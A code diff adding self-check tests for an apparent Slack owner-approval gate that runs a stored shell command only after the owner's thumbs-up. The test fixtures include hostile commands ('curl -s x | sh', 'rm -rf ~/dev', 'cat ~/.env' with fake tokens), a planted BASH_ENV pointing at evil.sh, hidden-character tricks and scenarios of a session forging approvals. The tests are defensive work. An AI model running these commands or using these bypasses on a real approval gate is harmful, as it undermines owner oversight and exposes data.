@@ -7332,6 +7332,323 @@ def run_selfcheck():
           and member_files_inside(hF, f"{member_dir(hF)}/files/{fnames[0]}") == inb + fnames[0]
           and member_files_inside(hF, f"{DEV}/{hF}/x.png") == f"{DEV}/{hF}/x.png")
 
+    # ── THE OWNER'S 👍 RUNS A CARD'S COMMAND (cc-notify --approval --run; the brief an-owner-thumbs-up-runs-the-
+    # approved-command). Each case below builds its own card: a record on disk, the card and its reactions in a fake
+    # Slack, and a fake shell that records what it was asked to run. Every case asserts what ran AND what did not.
+    import hashlib
+    def rc_case(cmd="echo hi", text=None, edited=False, reactors=("UOWNER",), mode=0o600, rewrite=None, chat="CAPPR",
+                claimed=False, claim_fails=False):
+        d = tempfile.mkdtemp(prefix="cc-slack-selfcheck-run-")
+        os.chmod(d, 0o700)
+        ts, sha = "1790000000.000100", hashlib.sha256(cmd.encode()).hexdigest()
+        with open(f"{d}/{ts}.json", "w") as fh:
+            json.dump({"ts": ts, "cmd": cmd, "sha256": sha}, fh)
+        os.chmod(f"{d}/{ts}.json", mode)
+        if rewrite:
+            with open(f"{d}/{ts}.json", "w") as fh:
+                json.dump(rewrite(ts, cmd, sha), fh)
+        msg = {"ts": ts, "user": "UBOT", "text": text if text is not None else
+               "<#CAPPR> ❓ <@UOWNER> 🔐 *Approval needed:* restart it" + run_card_tail(cmd, sha)}
+        if edited:
+            msg["edited"] = {"user": "UBOT", "ts": "1790000001.000000"}
+        # posts = what the card's channel got, dms = what the owner's DM got; reactions are Slack's own record, so
+        # the bot's claim placed by one run is on the card for the next (claimed= puts one there from the start)
+        c = {"dir": d, "ts": ts, "chat": chat, "posts": [], "dms": [], "reacts": [], "ran": [],
+             "claim": ["UBOT"] if claimed else []}
+        def fake(method, token, **kw):
+            if method == "auth.test":
+                return {"user_id": "UBOT"}
+            if method == "conversations.list":
+                return {"channels": [{"name": "approvals", "id": "CAPPR", "is_member": True}]}
+            if method == "conversations.history":
+                return {"messages": [msg]}
+            if method == "reactions.get":
+                return {"message": {"reactions": [{"name": "+1", "users": list(reactors)}]
+                                    + ([{"name": RUN_CLAIM, "users": list(c["claim"])}] if c["claim"] else [])}}
+            if method == "chat.postMessage":
+                if kw.get("channel") == "UOWNER":
+                    c["dms"].append(kw.get("text") or ""); return {"ts": "1790000003.000000"}
+                c["posts"].append((kw.get("thread_ts"), kw.get("text") or "")); return {"ts": "1790000002.000000"}
+            if method == "reactions.add":
+                if kw.get("name") == RUN_CLAIM:
+                    if claim_fails or "UBOT" in c["claim"]:
+                        raise RuntimeError("already_reacted" if c["claim"] else "ratelimited")
+                    c["claim"].append("UBOT")
+                c["reacts"].append(kw.get("name")); return {}
+            return {}
+        c["fake"] = fake
+        c["run"] = lambda argv, **kw: c["ran"].append(argv) or type("R", (), {"returncode": 0, "stdout": "hi\n", "stderr": ""})()
+        return c
+    def rc_go(c):
+        was_api, was_cards = globals()["api"], globals()["RUN_CARDS"]
+        globals()["api"], globals()["RUN_CARDS"] = c["fake"], c["dir"]
+        try:
+            with contextlib.redirect_stderr(io.StringIO()):
+                return run_approved({"SLACK_BOT_TOKEN": "xoxb-x", "SLACK_OWNER_ID": "UOWNER"}, c["chat"], c["ts"], run=c["run"])
+        finally:
+            globals()["api"], globals()["RUN_CARDS"] = was_api, was_cards
+    def rc_log(c):
+        try:
+            return open(f"{c['dir']}/log").read()
+        except OSError:
+            return ""
+
+    c = rc_case(cmd='echo "$HOME" > /dev/null; echo hi')
+    rc1 = rc_go(c)
+    check("run card: the owner's 👍 on a clean card claims it with the bot's ⏳ BEFORE it runs the STORED command once "
+          "with bash -c, replies in the card's thread with the exit code and NOT the output (members read #approvals), "
+          "sends the output tail to the owner's DM, and marks the card ✅",
+          rc1 == 0 and c["ran"] == [["bash", "-c", 'echo "$HOME" > /dev/null; echo hi']]
+          and len(c["posts"]) == 1 and c["posts"][0][0] == c["ts"] and "exit 0" in c["posts"][0][1]
+          and "hi" not in c["posts"][0][1] and "```" not in c["posts"][0][1]
+          and len(c["dms"]) == 1 and "hi" in c["dms"][0].split("Its output")[-1] and "exited 0" in c["dms"][0]
+          and c["reacts"] == [RUN_CLAIM, "white_check_mark"] and os.path.exists(f"{c['dir']}/{c['ts']}.ran"))
+    rc2 = rc_go(c)
+    check("run card: a second 👍 on the same card (or a second start) runs nothing, posts nothing, and the log says it "
+          "already ran",
+          rc2 is None and len(c["ran"]) == 1 and len(c["posts"]) == 1 and len(c["dms"]) == 1
+          and f":{RUN_CLAIM}: claim is already on the card" in rc_log(c))
+    os.remove(f"{c['dir']}/{c['ts']}.ran")
+    rc3 = rc_go(c)
+    check("run card: …and with its .ran file lost, or the record dir restored from a backup, it still runs nothing — "
+          "the bot's ⏳ on the card is Slack's own record that it ran",
+          rc3 is None and len(c["ran"]) == 1 and len(c["posts"]) == 1 and rc_log(c).count("claim is already on the card") == 2)
+    c = rc_case(claimed=True)
+    check("run card: a fresh card (no .ran on the host) that already carries the bot's ⏳ runs nothing and posts nothing",
+          rc_go(c) is None and not c["ran"] and not c["posts"] and not c["dms"] and "claim is already on the card" in rc_log(c))
+    c = rc_case()
+    c["claim"] = ["UMEMBER"]
+    check("run card: …while a member's own ⏳ on a card claims nothing, and the card runs",
+          rc_go(c) == 0 and len(c["ran"]) == 1)
+    c = rc_case(claim_fails=True)
+    rcF = rc_go(c)
+    check("run card: when the bot's ⏳ cannot be placed (Slack refuses, or is down) nothing runs, the host claim stays, "
+          "and a retry runs nothing either",
+          rcF is None and not c["ran"] and not c["posts"] and os.path.exists(f"{c['dir']}/{c['ts']}.ran")
+          and "could not be placed" in rc_log(c) and rc_go(c) is None and not c["ran"] and "already ran once" in rc_log(c))
+
+    c = rc_case(reactors=("UMEMBER",))
+    check("run card: with only a member's 👍 on the card nothing runs and nothing is posted — run-approved asks Slack "
+          "itself, so a session calling it by hand gets nothing the owner did not give",
+          rc_go(c) is None and not c["ran"] and not c["posts"] and "owner's 👍 is not on the card" in rc_log(c))
+    c = rc_case()
+    rc_go(c)
+    check("run card: …and the same card with the owner's 👍 on it does run (the fixture above is not what refused)",
+          len(c["ran"]) == 1)
+
+    c = rc_case(edited=True)
+    check("run card: an EDITED card runs nothing; the log and the thread both say so",
+          rc_go(c) is None and not c["ran"] and "edited" in rc_log(c)
+          and len(c["posts"]) == 1 and c["posts"][0][1].startswith("Not run: the card was edited"))
+    c = rc_case(rewrite=lambda ts, cmd, sha: {"ts": ts, "cmd": "rm -rf ~/dev", "sha256": sha})
+    check("run card: a command changed on disk after the card went out (sha256 kept) runs nothing",
+          rc_go(c) is None and not c["ran"] and "sha256 no longer matches" in rc_log(c))
+    c = rc_case(rewrite=lambda ts, cmd, sha: {"ts": ts, "cmd": "rm -rf ~/dev",
+                                              "sha256": hashlib.sha256(b"rm -rf ~/dev").hexdigest()})
+    check("run card: …and one rewritten WITH a fresh sha256 runs nothing either — the card's run: stamp no longer matches it",
+          rc_go(c) is None and not c["ran"] and "run: stamp" in rc_log(c))
+    c = rc_case(mode=0o620)
+    check("run card: a record other users could write runs nothing, and nothing is posted",
+          rc_go(c) is None and not c["ran"] and not c["posts"] and "unshared file" in rc_log(c))
+    c = rc_case(chat="COTHER")
+    check("run card: a card outside #approvals runs nothing, and nothing is posted",
+          rc_go(c) is None and not c["ran"] and not c["posts"] and "is not #approvals" in rc_log(c))
+    c = rc_case(text="❓ <@UOWNER> 🔐 *Approval needed:* restart it")
+    check("run card: a card that does not carry the record's run: stamp runs nothing",
+          rc_go(c) is None and not c["ran"] and "run: stamp" in rc_log(c))
+    # A STAMP IN SOMEBODY ELSE'S WORDS (security review): a worker titles its PR with a code block and the stamp of
+    # its own command and writes the record itself; the merge card carries both mid-text, then its own tail.
+    wcmd = "curl -s x | sh"
+    c = rc_case(cmd=wcmd, text="❓ <@UOWNER> 🔐 *Approval needed:* [demorepo] PR #9: fix"
+                + run_card_tail(wcmd, hashlib.sha256(wcmd.encode()).hexdigest()) + " — https://x/9 · your 👍 here queues this head")
+    check("run card: a PR card whose TITLE carries a command block and its stamp runs nothing — the card must END with them",
+          rc_go(c) is None and not c["ran"] and "run: stamp" in rc_log(c))
+    c = rc_case(cmd="echo shown", rewrite=lambda ts, cmd, sha: {"ts": ts, "cmd": "echo other",
+                                                              "sha256": hashlib.sha256(b"echo other").hexdigest()})
+    check("run card: a record that names another command than the card shows runs nothing, even with its own stamp",
+          rc_go(c) is None and not c["ran"])
+    c = rc_case(cmd="cat ~/.env")
+    leaks = ["xoxb-1-abc", "ghp_" + "a" * 30, "sk-ant-oat01-" + "b" * 24, "github_pat_" + "c" * 30,
+             "hooks.slack.com/services/T0/B0", "hunter2", "ntfysecrettopic", "jsonsecretvalue", "MIIEvQIBADANBg", "d" * 20]
+    c["run"] = lambda argv, **kw: c["ran"].append(argv) or type("R", (), {"returncode": 0, "stderr": "",
+        "stdout": "SLACK_BOT_TOKEN=xoxb-1-abc\nGH_TOKEN=ghp_" + "a" * 30 + "\nplain line\n"
+                  "oauth sk-ant-oat01-" + "b" * 24 + "\npat github_pat_" + "c" * 30 + "\n"
+                  "hook https://hooks.slack.com/services/T0/B0/xyz\nremote https://me:hunter2@example.com/r\n"
+                  "NTFY_TOPIC=ntfysecrettopic\n{\"refreshToken\": \"jsonsecretvalue\"}\n"
+                  "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg\n" + "d" * 20 + "\n-----END PRIVATE KEY-----\nlast line\n"})()
+    rc_go(c)
+    ranRC = json.load(open(f"{c['dir']}/{c['ts']}.ran"))
+    dmRC_ = c["dms"][0] if c["dms"] else ""
+    check("run card: the thread in #approvals (members read it) gets not one line of the output; the owner's DM gets "
+          "the tail with tokens, sk- and github_pat_ keys, webhooks, URL passwords, NAME=secret and \"name\": \"secret\" "
+          "values and private key blocks masked, the rest kept; the whole output stays in the 0600 .ran file",
+          len(c["posts"]) == 1 and not any(x in c["posts"][0][1] for x in leaks + ["plain line", "last line"])
+          and len(c["dms"]) == 1 and not [x for x in leaks if x in dmRC_]
+          and "plain line" in dmRC_ and "last line" in dmRC_ and "[redacted private key]" in dmRC_
+          and all(x in ranRC.get("out", "") for x in leaks))
+    notify_src = open(os.path.join(BIN, "cc-notify")).read()
+    check("run card: cc-notify --run writes the very words run_card_tail expects the card to end with",
+          RUN_LINE in notify_src and "· `run:%s`" in notify_src)
+
+    # WHAT A RUN TRUSTS IS NOT THE CALLER'S TO SET (security read of eb064268): the owner id, the bot token and the
+    # #approvals name come from the config in the password database's home, and that home, the record dir and what the
+    # command runs in never follow the caller's environment. hG plays the password database's home here; hP is what a
+    # session plants, and the environment points at it the three ways the review found.
+    hG, hP = tempfile.mkdtemp(prefix="cc-slack-selfcheck-pwhome-"), tempfile.mkdtemp(prefix="cc-slack-selfcheck-planted-")
+    for h, body in ((hG, "SLACK_BOT_TOKEN=xoxb-fixed\nSLACK_OWNER_ID=UOWNER\n"),
+                    (hP, "SLACK_BOT_TOKEN=xoxb-planted\nSLACK_OWNER_ID=UBOT\nSLACK_APPROVALS=planted\n")):
+        os.makedirs(f"{h}/.cc", mode=0o700)
+        with open(f"{h}/.cc/config", "w") as fh:
+            fh.write(body)
+        os.chmod(f"{h}/.cc/config", 0o600)
+    real_pw_home = PW_HOME
+    probe = subprocess.run([sys.executable, "-c", "import runpy, sys; g = runpy.run_path(sys.argv[1], run_name='probe'); "
+                            "print(g['PW_HOME']); print(g['RUN_CARDS'])", SELF], capture_output=True, text=True, timeout=60,
+                           env={**os.environ, "HOME": hP, "CC_CONFIG": f"{hP}/.cc/config"})
+    check("run card: with HOME and CC_CONFIG planted, a fresh cc-slack still takes its home and its run-record dir from "
+          "the password database",
+          probe.stdout.split("\n")[:2] == [str(real_pw_home), f"{real_pw_home or '/nonexistent'}/.cc/approvals/run"]
+          and hP not in probe.stdout)
+    def rc_runner(c, seen):
+        def run(argv, **kw):
+            c["ran"].append(argv); seen.append(kw)
+            return type("R", (), {"returncode": 0, "stdout": "hi\n", "stderr": ""})()
+        return run
+    def rc_cli(c, run=None, chans=()):
+        """The CLI itself, `cc-slack run-approved <chat> <ts>`, config and all; Slack is c's, plus any extra channels."""
+        toks = []
+        def fake(method, token, **kw):
+            toks.append(token)
+            if method == "conversations.list":
+                return {"channels": [{"name": "approvals", "id": "CAPPR", "is_member": True}, *chans]}
+            return c["fake"](method, token, **kw)
+        was = globals()["api"], globals()["RUN_CARDS"], globals()["PW_HOME"], EFFECTS.run_impl
+        globals()["api"], globals()["RUN_CARDS"], globals()["PW_HOME"], EFFECTS.run_impl = fake, c["dir"], hG, run or c["run"]
+        try:
+            with contextlib.redirect_stderr(io.StringIO()):
+                return cmd_run_approved([c["chat"], c["ts"]]), toks
+        finally:
+            globals()["api"], globals()["RUN_CARDS"], globals()["PW_HOME"], EFFECTS.run_impl = was
+    planted = {"HOME": hP, "CC_CONFIG": f"{hP}/.cc/config", "SLACK_OWNER_ID": "UBOT", "SLACK_BOT_TOKEN": "xoxb-planted",
+               "SLACK_APPROVALS": "planted", "BASH_ENV": f"{hP}/evil.sh"}
+    env_was = {k: os.environ.get(k) for k in [*planted, "CC_CONFIG_DENY"]}
+    os.environ.update(planted)
+    try:
+        c = rc_case(reactors=("UBOT",))
+        rcK, toksK = rc_cli(c)
+        check("run card: SLACK_OWNER_ID set to the BOT's id, with CC_CONFIG and HOME pointed at a planted config that says "
+              "the same, and the bot's own 👍 on the card: nothing runs, nothing is posted, and every Slack call used the "
+              "token from the password database's home",
+              rcK == 1 and not c["ran"] and not c["posts"] and "owner's 👍 is not on the card" in rc_log(c)
+              and toksK and set(toksK) == {"xoxb-fixed"})
+        c, seenK = rc_case(), []
+        rcK2, toksK2 = rc_cli(c, run=rc_runner(c, seenK))
+        envK = (seenK[0].get("env") or {}) if seenK else {}
+        check("run card: …and with the same environment the owner's own 👍 does run it, once, in the password database's "
+              "home with an environment built there: no BASH_ENV, SLACK_ or CC_CONFIG of the caller's reaches bash",
+              rcK2 == 0 and len(c["ran"]) == 1 and seenK[0].get("cwd") == hG and envK.get("HOME") == hG
+              and envK.get("PATH", "").startswith(f"{hG}/bin:") and set(toksK2) == {"xoxb-fixed"}
+              and not [k for k in envK if k in planted and k != "HOME"])
+        c = rc_case(chat="CPLANT")
+        rcC, _ = rc_cli(c, chans=[{"name": "planted", "id": "CPLANT", "is_member": True}])
+        check("run card: SLACK_APPROVALS naming another channel (in the environment and the planted config) moves nothing: "
+              "the owner's 👍 on a card there runs nothing",
+              rcC == 1 and not c["ran"] and not c["posts"] and "is not #approvals" in rc_log(c))
+        os.environ["CC_CONFIG_DENY"] = f"{hG}/.cc/config"
+        c = rc_case()
+        was_pw = globals()["PW_HOME"]; globals()["PW_HOME"] = hG
+        denied_cfg = run_cfg()
+        globals()["PW_HOME"] = was_pw
+        rcD, _ = rc_cli(c)
+        check("run card: a gate's CC_CONFIG_DENY on that config still holds (it reads as empty), and the owner's 👍 runs nothing",
+              denied_cfg == {} and rcD == 1 and not c["ran"] and "no bot token or owner id" in rc_log(c))
+    finally:
+        for k, v in env_was.items():
+            if v is None:
+                os.environ.pop(k, None)
+            else:
+                os.environ[k] = v
+    was_pw = globals()["PW_HOME"]; globals()["PW_HOME"] = None
+    none_cfg = run_cfg()
+    globals()["PW_HOME"] = was_pw
+    check("run card: a user the password database does not know reads no config at all, so nothing can run", none_cfg == {})
+
+    # THE CARD IS READ AGAIN WHERE IT RUNS (security read of eb064268): cc-notify refuses an open fence or a hidden
+    # character before it posts, but a card made with `cc-slack post` and a hand-written record never met cc-notify.
+    sha_hi = hashlib.sha256(b"echo hi").hexdigest()
+    c = rc_case(text="<#CAPPR> ❓ <@UOWNER> 🔐 *Approval needed:* restart it ```echo harmless" + run_card_tail("echo hi", sha_hi))
+    check("run card: three backticks in the card's own words (a fence the description opens) run nothing, and the "
+          "thread says why",
+          rc_go(c) is None and not c["ran"] and "three backticks" in rc_log(c)
+          and len(c["posts"]) == 1 and c["posts"][0][1].startswith("Not run:"))
+    c = rc_case(cmd="echo a ```b``` c")
+    check("run card: …and three backticks in the stored command run nothing either",
+          rc_go(c) is None and not c["ran"] and "three backticks" in rc_log(c))
+    hidden = {"RLO": "‮", "LRI": "⁦", "ZWSP": "​", "BOM": "﻿", "CR": "\r", "ESC": "\x1b",
+              "RLM": "‏", "LSEP": " ", "TAG": "\U000e0001"}
+    let_through = []
+    for name, ch in hidden.items():
+        c = rc_case(cmd=f"echo a{ch}b")
+        if rc_go(c) is not None or c["ran"] or "zero-width" not in rc_log(c):
+            let_through.append(name)
+    check(f"run card: a command holding any of {', '.join(hidden)} runs nothing", not let_through)
+    c = rc_case(text="<#CAPPR> ❓ <@UOWNER> 🔐 *Approval needed:* restart it‮ ti trats" + run_card_tail("echo hi", sha_hi))
+    check("run card: …and an RLO in the card's own words, with a clean command, runs nothing",
+          rc_go(c) is None and not c["ran"] and "zero-width" in rc_log(c))
+    c = rc_case(cmd="echo a\tb\necho done")
+    check("run card: …while a command with a tab and a newline in it runs", rc_go(c) == 0 and len(c["ran"]) == 1)
+    # Two copies of one test, perl's in cc-notify and run_hidden here: held to the same verdict on every sample.
+    mP = re.search(r"perl -CA -e '(exit\(\$ARGV\[0\] =~ /[^/]*/ \? 0 : 1\))' \"\$run", notify_src)
+    differ = []
+    for ch in [*hidden.values(), "\t", "\n", "a", "é", "👍", "️", "‍", " ", " ", "\x7f", "\u0085"]:
+        try:
+            pr = subprocess.run(["perl", "-CA", "-e", mP.group(1), f"x{ch}y"], capture_output=True, timeout=10)
+            if (pr.returncode == 0) != run_hidden(f"x{ch}y"):
+                differ.append(repr(ch))
+        except (OSError, AttributeError, subprocess.SubprocessError) as e:
+            differ.append(e.__class__.__name__); break
+    check("run card: cc-notify's perl test and run_hidden refuse exactly the same characters", mP and not differ)
+
+    # SINGLE-QUOTED SECRETS (security read of eb064268): the DM tail masks a quoted value whole, whichever the quote.
+    c = rc_case(cmd="cat ~/.env")
+    c["run"] = lambda argv, **kw: c["ran"].append(argv) or type("R", (), {"returncode": 0, "stderr": "",
+        "stdout": "API_KEY='sqsecret1 sqsecret1b'\n  password: 'yamlsecret2'\nDB_PASSWORD=\"dqsecret3 dqsecret3b\"\n"
+                  "export SECRET_TOKEN='unterminated4\nlast line\n"})()
+    rc_go(c)
+    dmSQ = c["dms"][0] if c["dms"] else ""
+    check("run card: API_KEY='…', YAML password: '…', NAME=\"… …\" and an unterminated quote are masked whole in the "
+          "owner's DM, the names and the quotes kept",
+          dmSQ and not [x for x in ("sqsecret1", "sqsecret1b", "yamlsecret2", "dqsecret3", "unterminated4") if x in dmSQ]
+          and "API_KEY='[redacted]'" in dmSQ and "password: '[redacted]'" in dmSQ and "last line" in dmSQ)
+
+    # THE DAEMON'S SIDE: a reaction in #approvals on a card with a record goes to on_run_card, never to the PR merge
+    # path; only the owner's 👍 starts run-approved, and anyone else's is a log line.
+    c = rc_case()
+    dmRC = Daemon(use_slack=False); dmRC.cfg = {"SLACK_OWNER_ID": "UOWNER", "SLACK_BOT_TOKEN": "xoxb-x"}; dmRC.bot_user = "UBOT"
+    dmRC.chan_name = lambda chat: "approvals"
+    apprRC, popRC = [], []
+    dmRC.on_approval = lambda *a, **k: apprRC.append(a) or None
+    was_cards, was_popen = globals()["RUN_CARDS"], EFFECTS.popen_impl
+    globals()["RUN_CARDS"], EFFECTS.popen_impl = c["dir"], (lambda argv, **kw: popRC.append(argv))
+    try:
+        with contextlib.redirect_stderr(io.StringIO()):
+            ev = lambda who, name="+1": {"type": "reaction_added", "user": who, "reaction": name,
+                                        "item": {"type": "message", "channel": "CAPPR", "ts": c["ts"]}}
+            dmRC.on_reaction(ev("UMEMBER"))
+            member_pop = list(popRC)
+            dmRC.on_reaction(ev("UOWNER", "eyes"))
+            dmRC.on_reaction(ev("UOWNER"))
+            dmRC.on_reaction({"type": "reaction_added", "user": "UOWNER", "reaction": "+1",
+                              "item": {"type": "message", "channel": "CAPPR", "ts": "1790000009.000100"}})
+    finally:
+        globals()["RUN_CARDS"], EFFECTS.popen_impl = was_cards, was_popen
+    check("run card (daemon): a member's 👍 on a run card starts nothing and says so in the log",
+          member_pop == [] and "is not the owner's — nothing runs" in rc_log(c))
+    check("run card (daemon): the owner's 👍 starts exactly one run-approved for that card and its chat (other reactions "
+          "start none), and never reaches the PR merge path; a 👍 on a card with no record still goes there",
+          len(popRC) == 1 and popRC[0][-3:] == ["run-approved", "CAPPR", c["ts"]] and len(apprRC) == 1
+          and apprRC[0][1] == "1790000009.000100")
+
     subprocess.run(["rm", "-rf", f"{DEV}/alice", f"{DEV}/bob", f"{DEV}/myrepo", f"{DEV}/other",
                     f"{DEV}/{hF}", f"{DEV}/{rF}"])
 
